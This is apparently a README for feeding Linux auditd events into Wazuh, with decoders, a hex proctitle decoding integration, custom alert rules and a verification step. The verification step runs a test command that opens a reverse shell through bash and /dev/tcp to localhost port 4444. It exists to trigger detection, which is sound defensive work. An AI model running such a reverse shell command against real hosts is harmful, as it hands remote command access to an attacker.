# Auditd + Wazuh with proctitle decoding integration

## 1. Objective

This integration allows you to:

* Capture auditd events (types SYSCALL, EXECVE, and PROCTITLE).

* Decode the proctitle field, which comes in hexadecimal, and transform it into human-readable text.

* Enrich Wazuh events with the exact command executed by the user.

* Generate correlation rules that trigger alerts when syscall=execve calls and specific commands are detected.

## 2. Requirements

* Wazuh Manager 4.12 (tested on this version).

* Auditd installed, enabled, and generating logs in /var/log/audit/audit.log.

* Auditd rules that log execve and proctitle, for example in /etc/audit/rules.d/audit.rules:

```bash
-a always,exit -F arch=b64 -S execve -k execmonitor
-a always,exit -F arch=b32 -S execve -k execmonitor
```

## 3. Step by step

### 3.1. Create custom decoders

* Modify the configuration to edit the default Auditd decoder in Wazuh.
 
* The relevant file is __0040-auditd_decoders.xml__

* Follow the documentation to apply this configuration: https://documentation.wazuh.com/4.6/user-manual/ruleset/custom.html

Includes decoders for:

* SYSCALL (extracts uid, auid, exe, syscall, comm, pid, ppid).

* PROCTITLE (extracts the hex field).

* EXECVE (extracts optional arguments).

Example block for PROCTITLE:

```xml
<!-- PROCTITLE -->
<decoder name="auditd-syscall">
  <parent>auditd</parent>
  <regex offset="after_regex">type=PROCTITLE msg=audit\(\S+\): proctitle=(\.+)</regex>
  <order>audit.proctitle.msg, audit.proctitle.value</order>
</decoder>
```

### 3.2. Decoding script (custom integration)

File: __/var/ossec/integrations/custom-auditd_decoder.py__

This script converts the HEX proctitle field into clear text and returns it as a new generated alert.

Required Permissions:

```bash
chmod 750 /var/ossec/integrations/custom-auditd_decoder.py
chown root:wazuh /var/ossec/integrations/custom-auditd_decoder.py
```

### 3.3. Define the integration in Wazuh

In __/var/ossec/etc/ossec.conf__, inside __<ossec_config>__:

```xml
<integration>
  <name>custom-auditd_decoder.py</name>
  <rule_id>100371</rule_id>
  <alert_format>json</alert_format>
</integration>
```

### 3.4. Create custom rules

File: __/var/ossec/etc/rules/audit_custom.xml__

Basic Example:

```xml
<rule id="100365" level="3">
    <if_sid>80700</if_sid>
    <field name="audit.type">SYSCALL</field>
    <description>Auditd: Syscall</description>
</rule>

<rule id="100371" level="3">
    <if_sid>100365</if_sid>
    <field name="audit.proctitle.msg">(\S+)</field>
    <description>Auditd: evento de syscall encodeado</description>    
</rule>

<rule id="100390" level="3">
    <field name="integration">custom-auditd_decoder</field>
    <description>Auditd: evento decodeado</description>    
</rule>

```

## 4. Restart services

After each change, restart Wazuh Manager:

```bash
systemctl restart wazuh-manager
```

## 5. Verification and testing

### 1. Generate a controlled event by executing:

```bash
find /tmp -name "temp_file.txt" -exec /usr/bin/python3 -c "import os; os.system('bash -i >& /dev/tcp/127.0.0.1/4444 0>&1')" \;
```

### 2. Check the Wazuh log

![](./media/auditd1.png)

![](./media/auditd2.png)

![](./media/auditd3.png)

## 6. Expected results

Each command execution via execve is reflected in Wazuh with:

* User (uid, auid).
  
* Process (exe, comm, pid, ppid).
  
* Exact command in clear text (proctitle.msg).